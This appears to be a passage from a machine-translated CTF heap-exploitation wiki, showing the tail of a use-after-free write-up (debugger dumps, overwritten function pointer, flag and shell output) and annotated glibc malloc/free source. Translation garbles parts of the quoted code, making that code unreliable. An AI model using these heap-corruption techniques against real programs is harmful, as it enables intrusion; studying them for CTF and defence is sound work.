<p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ registers ]\u2500\u2500\u2500\u2500</p> <p>$eax   : 0x0804b008  \u2192  0x00000000</p> <p>$ebx   : 0x0804b040  \u2192  0x0804865b  \u2192   push ebp <p>$ ecx: 0xf7fac780 \u2192 0x00000000 $edx   : 0x0804b008  \u2192  0x00000000</p> <p>$esp   : 0xffffcf10  \u2192  0x00000008</p> <p>$ebp   : 0xffffcf48  \u2192  0xffffcf68  \u2192  0x00000000 $ you are: 0xf7fac000 \u2192 0x001b1db0 $ edi: 0xf7fac000 \u2192 0x001b1db0 $ Eip: 0x08048761 \u2192  add esp, 0x10 $cs    : 0x00000023 <p>$ss    : 0x0000002b</p> <p>$ds    : 0x0000002b</p> <p>$ is: 0x0000002b $fs    : 0x00000000</p> <p>$gs    : 0x00000063</p> <p>$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]</p> <p>\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500</p> <pre><code>0x8048752 &lt;add_note+220&gt;   mov    al, ds:0x458b0804\n\n0x8048757 &lt;add_note+225&gt;   call   0x581173df\n\n0x804875c &lt;add_note+230&gt;   call   0x80484e0 &lt;malloc@plt&gt;\n</code></pre> <p>\u2192  0x8048761    add    esp, 0x10 <pre><code>Let&amp;#39;s examine it in detail. Looking at the situation before the overlay, we can see that the put pointer of the memory block has been set to NULL, which is determined by the free mechanism of fastbin.\n\n\n`` `asm\ngef\u27a4  x/2xw 0x804b008\n\n0x804b008:  0x00000000  0x0804b018\n</code></pre> <p>After coverage, the specific values are as follows</p> <p><code>`</code>asm gef\u27a4  x/2xw 0x804b008</p> <p>0x804b008:  0x08048986  0x0804b00a</p> <p>gef\u27a4  x/i 0x08048986</p> <p>0x8048986 :   push   ebp <pre><code>It can be seen that it has indeed been covered as the magic function we want.\n\n\nThe final execution is as follows\n\n\n```shell\n\n[+] Starting local process './hacknote': pid 35030\n\n[*] Switching to interactive mode\n\nflag{use_after_free}----------------------\n\n       HackNote       \n\n----------------------\n\n 1. Add note          \n\n 2. Delete note       \n\n 3. Print note        \n\n 4. Exit              \n\n----------------------\n</code></pre> <p>At the same time, we can also use gef's heap-analysis-helper to see the application and release of the whole heap, as follows</p> <p><code>`</code>asm gef\u27a4  heap-analysis-helper </p> <p>[*] This feature is under development, expect bugs and unstability...</p> <p>[+] Tracking malloc()</p> <p>[+] Tracking free()</p> <p>[+] Tracking realloc()</p> <p>[+] Disabling hardware watchpoints (this may increase the latency)</p> <p>[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.</p> <p>[*] Note: The heap analysis slows down noticeably the execution. </p> <p>gef\u27a4  c</p> <p>Continuing.</p> <p>[+] Heap-Analysis - malloc(8)=0x804b008</p> <p>[+] Heap-Analysis - malloc(8)=0x804b008</p> <p>[+] Heap-Analysis - malloc(32)=0x804b018</p> <p>[+] Heap-Analysis - malloc(8)=0x804b040</p> <p>[+] Heap-Analysis - malloc(32)=0x804b050</p> <p>[+] Heap-Analysis - free(0x804b018)</p> <p>[+] Heap-Analysis - watching 0x804b018</p> <p>[+] Heap-Analysis - free(0x804b008)</p> <p>[+] Heap-Analysis - watching 0x804b008</p> <p>[+] Heap-Analysis - free(0x804b050)</p> <p>[+] Heap-Analysis - watching 0x804b050</p> <p>[+] Heap-Analysis - free(0x804b040)</p> <p>[+] Heap-Analysis - watching 0x804b040</p> <p>[+] Heap-Analysis - malloc(8)=0x804b040</p> <p>[+] Heap-Analysis - malloc(8)=0x804b008</p> <p>[+] Heap-Analysis - Cleaning up</p> <p>[+] Heap-Analysis - Re-enabling hardware watchpoints</p> <p>[New process 36248]</p> <p>process 36248 is executing new program: /bin/dash</p> <p>[New process 36249]</p> <p>process 36249 is executing new program: /bin/cat</p> <p>[Inferior 3 (process 36249) exited normally]</p> <p>```</p> <p>The first output here is twice, it should be a problem with the gef tool.</p>"},{"location":"pwn/linux/glibc-heap/use_after_free/#topic","title":"topic","text":"<ul> <li>2016 HCTF mount</li> </ul>"},{"location":"pwn/linux/glibc-heap/implementation/basic/","title":"\u57fa\u672c\u64cd\u4f5c","text":""},{"location":"pwn/linux/glibc-heap/implementation/basic/#unlink","title":"unlink","text":"<p>Unlink is used to take out an element in a doubly linked list (only free chunks), which may be used in the following places.</p> <ul> <li> <p>malloc</p> </li> <li> <p>Get chunks from a large bin of exactly the right size.</p> </li> <li>It should be noted here that fastbin and small bin do not use unlink, which is why vulnerabilities often appear here.</li> <li>Unlink is also not used when traversing the unsorted bin in turn.</li> <li>Take a chunk from the bin larger than the bin where the requested chunk is located.</li> <li> <p>free</p> </li> <li> <p>Backward merge, merge physical adjacent low address free chunks.</p> </li> <li>Forward merge, merge physical neighbor high address free chunks (except top chunk).</li> <li> <p>malloc_consolidate</p> </li> <li> <p>Backward merge, merge physical adjacent low address free chunks.</p> </li> <li>Forward merge, merge physical neighbor high address free chunks (except top chunk).</li> <li> <p>realloc</p> </li> <li> <p>Forward expansion, merging physical adjacent high address free chunks (except top chunk).</p> </li> </ul> <p>Since unlink is used very frequently, unlink is implemented as a macro, as follows</p> <pre><code>/* Take a chunk off a bin list */\n\n// unlink p\n\n#define unlink (AV, P, BK, FD) {\n// Since P is already in the doubly linked list, there are two places to record its size, so check if the size is the same.\n    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \\\n\n      malloc_printerr (\"corrupted size vs. prev_size\");               \\\n\n    FD = P-&gt;fd;                                                                      \\\n\n    BK = P-&gt;bk;                                                                      \\\n\n/ / Prevent the attacker from simply tampering with the fd and bk of the free chunk to achieve arbitrary write effects.\n    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \\\n\n      malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \\\n\n    else {                                                                      \\\n\nFD-&gt;bk = BK; \\\nBK-&gt;fd = FD; \\\n/ / The following mainly consider the modification of the nextsize doubly linked list corresponding to P\n        if (!in_smallbin_range (chunksize_nomask (P))                              \\\n\n// If P-&gt;fd_nextsize is NULL, it means that P is not inserted into the nextsize list.\n// Then there is no need to modify the nextsize field.\n// There is no way to determine the bk_nextsize field, which may cause problems.\n            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {                      \\\n\n/ / Similar to the small chunk check idea\n            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)              \\\n\n                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \\\n\n              malloc_printerr (check_action,                                      \\\n\n                               \"corrupted double-linked list (not small)\",    \\\n\nP, AV); \\\n// This shows that P is already in the nextsize list.\n// If the FD is not in the nextsize list\n            if (FD-&gt;fd_nextsize == NULL) {                                      \\\n\n// If the double-linked list of nextsize is only P itself, then take P directly\n// Let FD be a string of nextsize\n                if (P-&gt;fd_nextsize == P)                                      \\\n\nFD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \\\n                else {                                                              \\\n\n// Otherwise we need to insert the FD into the double-linked list formed by nextsize\n                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              \\\n\n                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              \\\n\n                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              \\\n\n                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              \\\n\n                  }                                                              \\\n\n              } else {                                                              \\\n\n// If you are, take it straight away.\n                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      \\\n\n                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      \\\n\n              }                                                                      \\\n\n          }                                                                      \\\n\n      }                                                                              \\\n\n}\n</code></pre> <p>Here we introduce the unlink of small bin as an example. For unbin of large bin, it is similar to just one additional size.</p> <p></p> <p>It can be seen that the final fd and bk pointers of P have not changed, but when we go through the entire doubly linked list, we have not traversed the corresponding linked list. This is not useful for change, because we can sometimes use this method to leak addresses.</p> <ul> <li>libc address</li> <li>P is located in the head of the doubly linked list, bk leaks</li> <li>P is located at the end of the doubly linked list, fd leaks</li> <li>When the doubly linked list contains only one free chunk, P is in the doubly linked list, and both fd and bk can leak.</li> <li>Leaked heap address, doubly linked list contains multiple free chunks</li> <li>P is located in the head of the doubly linked list, fd leaks</li> <li>P is in the doubly linked list, both fd and bk can leak</li> <li>P is located at the end of the doubly linked list, bk leaks</li> </ul> <p>note</p> <ul> <li>The header here refers to the chunk pointed to by the fd of bin, which is the latest chunk added in the doubly linked list.</li> <li>The tail here refers to the chunk pointed to by bk of bin, which is the first chunk added in the doubly linked list.</li> </ul> <p>At the same time, for both fd, bk and fd_nextsize, bk_nextsize, the program will check if fd and bk meet the corresponding requirements.</p> <pre><code>// fd bk\nif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \\\n\n  malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \\\n\n\n\n  // next_size related\n\n              if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)              \\\n\n                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \\\n\n              malloc_printerr (check_action,                                      \\\n\n                               \"corrupted double-linked list (not small)\",    \\\n\nP, AV);\n</code></pre> <p>It seems to be normal. Let us take fd and bk as an example. The bk of the forward chunk of P is naturally P, and the fd of the backward chunk of P is also naturally P. If we do not check the corresponding, we can modify the fd and bk of P, so that the effect of writing at any address can be easily achieved. For a more detailed example, see the Unlink section of the Utilization section.</p> <p>**Note: The prev_inuse bit recorded by the first chunk of the heap defaults to 1. **</p>"},{"location":"pwn/linux/glibc-heap/implementation/basic/#malloc_printerr","title":"malloc_printerr","text":"<p>The <code>malloc_printerr</code> function is called when an error is detected in glibc malloc.</p> <pre><code>static void malloc_printerr(const char *str) {\n\n  __libc_message(do_abort, \"%s\\n\", str);\n\n  __builtin_unreachable();\n\n}\n</code></pre> <p>Mainly will call <code>__libc_message</code> to execute the <code>abort</code> function, as follows</p> <pre><code>  if ((action &amp; do_abort)) {\n    if ((action &amp; do_backtrace))\n\n      BEFORE_ABORT(do_abort, written, fd);\n\n\n\n    /* Kill the application.  */\n\nabortion();\n  }\n</code></pre> <p>In the <code>abort</code> function, flibsh stream will be used when glibc is still 2.23.</p> <pre><code>  /* Flush all streams.  We cannot close them now because the user\n\n     might have registered a handler for SIGABRT.  */\n\n  if (stage == 1)\n\n    {\n\n      ++stage;\n\n      fflush (NULL);\n\n    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/","title":"release memory block","text":""},{"location":"pwn/linux/glibc-heap/implementation/free/#__libc_free","title":"__libc_free","text":"<p>Similar to malloc, the free function also has a wrapper, and the naming format is basically similar to malloc. code show as below</p> <pre><code>void __libc_free(void *mem) {\n\nmstate ar_ptr;\n    mchunkptr p; /* chunk corresponding to mem */\n\n/ / Determine whether there is a hook function __free_hook\n    void (*hook)(void *, const void *) = atomic_forced_read(__free_hook);\n\n    if (__builtin_expect(hook != NULL, 0)) {\n\n        (*hook)(mem, RETURN_ADDRESS(0));\n\n        return;\n\n    }\n\n// free NULL has no effect\n    if (mem == 0) /* free(0) has no effect */\n\n        return;\n\n/ / Convert mem to chunk state\n    p = mem2chunk(mem);\n\n// If the block memory is obtained by mmap\n    if (chunk_is_mmapped(p)) /* release mmapped memory. */\n\n    {\n\n        /* See if the dynamic brk/mmap threshold needs adjusting.\n\n       Dumped fake mmapped chunks do not affect the threshold.  */\n\n        if (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold &amp;&amp;\n\n            chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp;\n\n            !DUMPED_MAIN_ARENA_CHUNK(p)) {\n\n            mp_.mmap_threshold = chunksize(p);\n\n            mp_.trim_threshold = 2 * mp_.mmap_threshold;\n\n            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, 2,\n\n                       mp_.mmap_threshold, mp_.trim_threshold);\n\n        }\n\n        munmap_chunk(p);\n\n        return;\n\n    }\n\n// Get a pointer to the allocation area according to the chunk\n    ar_ptr = arena_for_chunk(p);\n\n// execute release\n    _int_free(ar_ptr, p, 0);\n\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/#_int_free","title":"_int_free","text":"<p>The initial time of the function defines a series of variables and gets the size of the chunk the user wants to release.</p> <pre><code>static void _int_free(mstate av, mchunkptr p, int have_lock) {\n\n    INTERNAL_SIZE_T size;      /* its size */\n\n    mfastbinptr *   fb;        /* associated fastbin */\n\n    mchunkptr       nextchunk; /* next contiguous chunk */\n\n    INTERNAL_SIZE_T nextsize;  /* its size */\n\n    int             nextinuse; /* true if nextchunk is used */\n\n    INTERNAL_SIZE_T prevsize;  /* size of previous contiguous chunk */\n\n    mchunkptr       bck;       /* misc temp for linking */\n\n    mchunkptr       fwd;       /* misc temp for linking */\n\n\n\n    const char *errstr = NULL;\n\n    int         locked = 0;\n\n\n\n    size = chunksize(p);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/#simple-check","title":"Simple check","text":"<pre><code>    /* Little security check which won't hurt performance: the\n\n       allocator never wrapps around at the end of the address space.\n\n       Therefore we can exclude some size values which might appear\n\n       here by accident or by \"design\" from some intruder.  */\n\n// The pointer cannot point to an illegal address, it must be less than or equal to -size, why? ? ?\n// The pointer must be aligned, 2*SIZE_SZ This alignment is carefully thought about\n    if (__builtin_expect((uintptr_t) p &gt; (uintptr_t) -size, 0) ||\n\n        __builtin_expect(misaligned_chunk(p), 0)) {\n\n        errstr = \"free(): invalid pointer\";\n\n    errout:\n\n        if (!have_lock &amp;&amp; locked) __libc_lock_unlock(av-&gt;mutex);\n\n        malloc_printerr(check_action, errstr, chunk2mem(p), av);\n\n        return;\n\n    }\n\n    /* We know that each chunk is at least MINSIZE bytes in size or a\n\n       multiple of MALLOC_ALIGNMENT.  */\n\n// The size is not the smallest chunk, or the size is not an integer multiple of MALLOC_ALIGNMENT\n    if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size))) {\n\n        errstr = \"free(): invalid size\";\n\n        goto errout;\n\n    }\n\n/ / Check if the chunk is in use, no effect in the non-debug state\n    check_inuse_chunk(av, p);\n</code></pre> <p>among them</p> <pre><code>/* Check if m has acceptable alignment */\n\n\n\n#define aligned_OK(m) (((unsigned long) (m) &amp;MALLOC_ALIGN_MASK) == 0)\n\n\n\n#define misaligned_chunk(p)                                                    \\\n\n    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \\\n\n     MALLOC_ALIGN_MASK)\n</code></pre> <p>I am almost</p> <p>If the above checks are all qualified, it is judged whether the current bin is in the fast bin range, and if it is inserted into the fastbin header, it becomes the first free chunk** corresponding to the fastbin list.</p> <pre><code>    /*\n\n      If eligible, place chunk on a fastbin so it can be found\n\n      and used quickly in malloc.\n\n    */\n\n\n\n    if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast())\n\n\n\n#if TRIM_FASTBINS\n\n        /*\n\n      If TRIM_FASTBINS set, don't place chunks\n\n      bordering top into fastbins\n\n        */\n\n//Default #define TRIM_FASTBINS 0, so the following statement will not execute by default\n// If the current chunk is a fast chunk and the next chunk is a top chunk, it cannot be inserted\n        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)\n#endif\n            ) {\n\n// The size of the next chunk cannot be less than twice the SIZE_SZ, and\n// The size of the next chunk cannot be greater than system_mem, which is generally 132k\n// If this happens, an error is reported.\n        if (__builtin_expect(\n\n                chunksize_nomask(chunk_at_offset(p, size)) &lt;= 2 * SIZE_SZ, 0) ||\n\n            __builtin_expect(\n\n                chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, 0)) {\n\n            /* We might not have a lock at this point and concurrent\n\n               modifications\n\n               of system_mem might have let to a false positive.  Redo the test\n\n               after getting the lock.  */\n\n            if (have_lock || ({\n\n                    assert(locked == 0);\n\n__libc_lock_lock (de-&amp;gt; mutex);\n                    locked = 1;\n\n                    chunksize_nomask(chunk_at_offset(p, size)) &lt;= 2 * SIZE_SZ ||\n\n                        chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;\n\n                })) {\n\n                errstr = \"free(): invalid next size (fast)\";\n\n                goto errout;\n\n            }\n\n            if (!have_lock) {\n\n__libc_lock_unlock (de-&amp;gt; mutex);\n                locked = 0;\n\n            }\n\n        }\n\n// Set the mem part of the chunk to perturb_byte\n        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);\n\n/ / Set the flag bit of the fast chunk\nset_fastchunks (of);\n/ / Get the index of the fast bin according to the size\n        unsigned int idx = fastbin_index(size);\n\n// Get the head pointer corresponding to fastbin, which is NULL after being initialized.\nfb = &amp;amp; fastbin (av, idx);\n\n\n        /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */\n\n// Insert P into the linked list using atomic operations\n        mchunkptr    old     = *fb, old2;\n\n        unsigned int old_idx = ~0u;\n\n        do {\n\n            /* Check that the top of the bin is not the record we are going to\n\n               add\n\n               (i.e., double free).  */\n\n            // so we can not double free one fastbin chunk\n\n// prevent against fast bin double free\n            if (__builtin_expect(old == p, 0)) {\n\n                errstr = \"double free or corruption (fasttop)\";\n\n                goto errout;\n\n            }\n\n            /* Check that size of fastbin chunk at the top is the same as\n\n               size of the chunk that we are adding.  We can dereference OLD\n\n               only if we have the lock, otherwise it might have already been\n\n               deallocated.  See use of OLD_IDX below for the actual check.  */\n\n            if (have_lock &amp;&amp; old != NULL)\n\n                old_idx = fastbin_index(chunksize(old));\n\n            p-&gt;fd = old2 = old;\n\n        } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) !=\n\n                 old2);\n\n// Make sure the fast bin is added before and after joining\n        if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect(old_idx != idx, 0)) {\n\n            errstr = \"invalid fastbin entry (free)\";\n\n            goto errout;\n\n        }\n\n    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/#merging-non-mmap-free-chunks","title":"Merging non-mmap free chunks","text":"<p>Unlink will only be triggered if it is not a fast bin</p> <p>First, let's talk about why the chunks are merged. This is to avoid too many fragmented memory blocks in the heap. After the merge, it can be used to handle larger memory block requests. The main order of the merge is</p> <ul> <li>Consider the physical low address free block first</li> <li>After considering the physical high address free block</li> </ul> <p>**The merged chunk points to the lower address of the merged chunk. **</p> <p>In the absence of a lock, the lock is first obtained.</p> <pre><code>    /*\n\n      Consolidate other non-mmapped chunks as they arrive.\n\n    */\n\n\n\n    else if (!chunk_is_mmapped(p)) {\n\n        if (!have_lock) {\n\n__libc_lock_lock (de-&amp;gt; mutex);\n            locked = 1;\n\n        }\n\n        nextchunk = chunk_at_offset(p, size);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/#lightweight-inspection","title":"Lightweight inspection","text":"<pre><code>        /* Lightweight tests: check whether the block is already the\n\n           top block.  */\n\n// The current free chunk cannot be the top chunk\n        if (__glibc_unlikely(p == av-&gt;top)) {\n\n            errstr = \"double free or corruption (top)\";\n\n            goto errout;\n\n        }\n\n// The next chunk of the current free chunk cannot exceed the bound of arena\n        /* Or whether the next chunk is beyond the boundaries of the arena.  */\n\n        if (__builtin_expect(contiguous(av) &amp;&amp;\n\n                                 (char *) nextchunk &gt;=\n\n((char *) off-&amp;gt; top + chunksize (off-&amp;gt; top)),\n                             0)) {\n\n            errstr = \"double free or corruption (out)\";\n\n            goto errout;\n\n        }\n\n// The currently used chunk&amp;#39;s usage tag is not marked, double free\n        /* Or whether the block is actually not marked used.  */\n\n        if (__glibc_unlikely(!prev_inuse(nextchunk))) {\n\n            errstr = \"double free or corruption (!prev)\";\n\n            goto errout;\n\n        }\n\n// the size of the next chunk\n        nextsize = chunksize(nextchunk);\n\n        // next chunk size valid check\n\n/ / Determine whether the size of the next chunk is not greater than 2 * SIZE_SZ, or\n// Whether nextsize is greater than the memory available in the system\n        if (__builtin_expect(chunksize_nomask(nextchunk) &lt;= 2 * SIZE_SZ, 0) ||\n\n            __builtin_expect(nextsize &gt;= av-&gt;system_mem, 0)) {\n\n            errstr = \"free(): invalid next size (normal)\";\n            goto errout;\n\n        }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/#release-padding","title":"Release padding","text":"<pre><code>/ / Set the mem part of the pointer to perturb_byte\n        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/#backward-merge-merge-low-address-chunk","title":"Backward merge-merge low address chunk","text":"<pre><code>        /* consolidate backward */\n\n        if (!prev_inuse(p)) {\n\n            prevsize = prev_size(p);\n\n            size += prevsize;\n\n            p = chunk_at_offset(p, -((long) prevsize));\n\nunlink (off, p, bck, fwd);\n        }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/#the-next-block-is-not-a-top-chunk-forward-merge-merge-high-address-chunk","title":"The next block is not a top chunk - forward merge - merge high address chunk","text":"<p>It should be noted that if the next block is not the top chunk, merge the chunks with the high address and put the merged chunk into the unsorted bin.</p> <pre><code>// If the next chunk is not the top chunk\n        if (nextchunk != av-&gt;top) {\n\n            /* get and clear inuse bit */\n\n/ / Get the use status of the next chunk\n            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n\n// If not used, merge, otherwise clear the current chunk usage status.\n            /* consolidate forward */\n\n            if (!nextinuse) {\n\n                unlink(av, nextchunk, bck, fwd);\n\n                size += nextsize;\n\n            } else\n\n                clear_inuse_bit_at_offset(nextchunk, 0);\n\n\n\n            /*\n\n          Place the chunk in unsorted chunk list. Chunks are\n\n          not placed into regular bins until after they have\n\n          been given one chance to be used in malloc.\n\n            */\n\n// put the chunk in the head of the unsorted chunk list\nbck = unsorted_chunks (off);\n            fwd = bck-&gt;fd;\n\n// Simple check\n            if (__glibc_unlikely(fwd-&gt;bk != bck)) {\n\n                errstr = \"free(): corrupted unsorted chunks\";\n\n                goto errout;\n\n            }\n\n            p-&gt;fd = fwd;\n\n            p-&gt;bk = bck;\n\n// If it is a large chunk, set the nextsize pointer field to NULL.\n            if (!in_smallbin_range(size)) {\n\n                p-&gt;fd_nextsize = NULL;\n\n                p-&gt;bk_nextsize = NULL;\n\n            }\n\n            bck-&gt;fd = p;\n\n            fwd-&gt;bk = p;\n\n\n\n            set_head(p, size | PREV_INUSE);\n\n            set_foot(p, size);\n\n\n\ncheck_free_chunk (av, p);\n        }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/#the-next-block-is-the-top-chunk-merged-into-the-top-chunk","title":"The next block is the top chunk- merged into the top chunk","text":"<pre><code>        /*\n\n          If the chunk borders the current high end of memory,\n\n          consolidate into top\n\n        */\n\n// If the next chunk of the chunk to be released is the top chunk, merge it into the top chunk\n        else {\n\n            size += nextsize;\n\n            set_head(p, size | PREV_INUSE);\n\nof -&amp;gt; top = p;\ncheck_chunk (av, p);\n        }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/#returning-memory-to-the-system","title":"Returning memory to the system","text":"<pre><code>        /*\n\n          If freeing a large space, consolidate possibly-surrounding\n\n          chunks. Then, if the total unused topmost memory exceeds trim\n\n          threshold, ask malloc_trim to reduce top.\n\n\n\n          Unless max_fast is 0, we don't know if there are fastbins\n\n          bordering top, so we cannot tell for sure whether threshold\n\n          has been reached unless fastbins are consolidated.  But we\n\n          don't want to consolidate on each free.  As a compromise,\n\n          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD\n\n          is reached.\n\n        */\n\n// If the size of the merged chunk is greater than FASTBIN_CONSOLIDATION_THRESHOLD\n// Normally merged into the top chunk will execute this part of the code.\n// Then return the memory to the system\n        if ((unsigned long) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) {\n\n// merge if there is a fast chunk\nif (have_fastchunks (off)) malloc_consolidate (off);\n// main allocation area\nif (by == &amp;amp; main_arena) {\n#ifndef MORECORE_CANNOT_TRIM\n\n// top chunk is greater than the current contraction threshold\n                if ((unsigned long) (chunksize(av-&gt;top)) &gt;=\n\n                    (unsigned long) (mp_.trim_threshold))\n\nsystrim (mp_.top_pad, off);\n#endif // Non-primary allocation area, directly shrinking heap\n            } else {\n\n                /* Always try heap_trim(), even if the top chunk is not\n\n                   large, because the corresponding heap might go away.  */\n\nheap_info * heap = heap_for_ptr (top (off));\n\n\nassert (heap-&amp;gt; ar_ptr == off);\n                heap_trim(heap, mp_.top_pad);\n\n            }\n\n        }\n\n\n\n        if (!have_lock) {\n            assert(locked);\n\n__libc_lock_unlock (de-&amp;gt; mutex);\n        }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/#release-the-chunk-of-mmap","title":"Release the chunk of mmap","text":"<pre><code>    } else {\n\n        //  If the chunk was allocated via mmap, release via munmap().\n\n        munmap_chunk(p);\n\n    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/free/#systrim","title":"systrim","text":""},{"location":"pwn/linux/glibc-heap/implementation/free/#heap_trim","title":"heap_trim","text":""},{"location":"pwn/linux/glibc-heap/implementation/free/#munmap_chunk","title":"munmap_chunk","text":""},{"location":"pwn/linux/glibc-heap/implementation/heap-init/","title":"\u5806 initialization","text":"<p>The heap initialization is performed by executing malloc_consolidate and then executing malloc_init_state when the user first requests memory. I won\u2019t explain too much here. See the <code>malloc_state</code> correlation function.</p>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/","title":"Apply for a memory block","text":""},{"location":"pwn/linux/glibc-heap/implementation/malloc/#__libc_malloc","title":"__libc_malloc","text":"<p>In general, we will use the malloc function to apply for a block of memory, but when we look closely at the source implementation of glibc, there is actually no malloc function. In fact, the function actually calls the __libc_malloc function. Why not just write a malloc function directly, because sometimes we may need different names. In addition, the __libc_malloc function is simply used to simply wrap the _int_malloc function. _int_malloc is the core of the application memory block. Let's take a closer look at the specific implementation.</p> <p>This function first checks if there is a hook function (__malloc_hook) for the memory allocation function. This is mainly used for user-defined heap allocation functions, which is convenient for users to quickly modify and evaluate the allocation function. It should be noted here that the ** user-applied byte becomes an unsigned integer** once it enters the application memory function.</p> <pre><code>// wapper for int_malloc\n\nvoid *__libc_malloc(size_t bytes) {\n    mstate ar_ptr;\n    void * victim;\n\n    // Check if there is a memory allocation hook, if so, call the hook and return.\n    void *(*hook)(size_t, const void *) = atomic_forced_read(__malloc_hook);\n\n    if (__builtin_expect(hook != NULL, 0))\n        return (*hook)(bytes, RETURN_ADDRESS(0));\n</code></pre> <p>Then I will look for an arena to try to allocate memory.</p> <pre><code>    arena_get(ar_ptr, bytes);\n</code></pre> <p>Then call the _int_malloc function to request the corresponding memory.</p> <pre><code>    victim = _int_malloc(ar_ptr, bytes);\n</code></pre> <p>If the allocation fails, ptmalloc will try to find another available arena and allocate memory.</p> <pre><code>    /* Retry with another arena only if we were able to find a usable arena\n       before.  */\n    if (!victim &amp;&amp; ar_ptr != NULL) {\n        LIBC_PROBE(memory_malloc_retry, 1, bytes);\n        ar_ptr = arena_get_retry(ar_ptr, bytes);\n        victim = _int_malloc(ar_ptr, bytes);\n    }\n</code></pre> <p>If you apply for arena, you have to unlock it before you quit.</p> <pre><code>    if (ar_ptr != NULL) __libc_lock_unlock(ar_ptr-&gt;mutex);\n</code></pre> <p>Determine if the current status meets the following conditions</p> <ul> <li>Either didn't apply to memory</li> <li>either mmap memory</li> <li>Either the requested memory must be in its assigned arena</li> </ul> <pre><code>    assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||\n           ar_ptr == 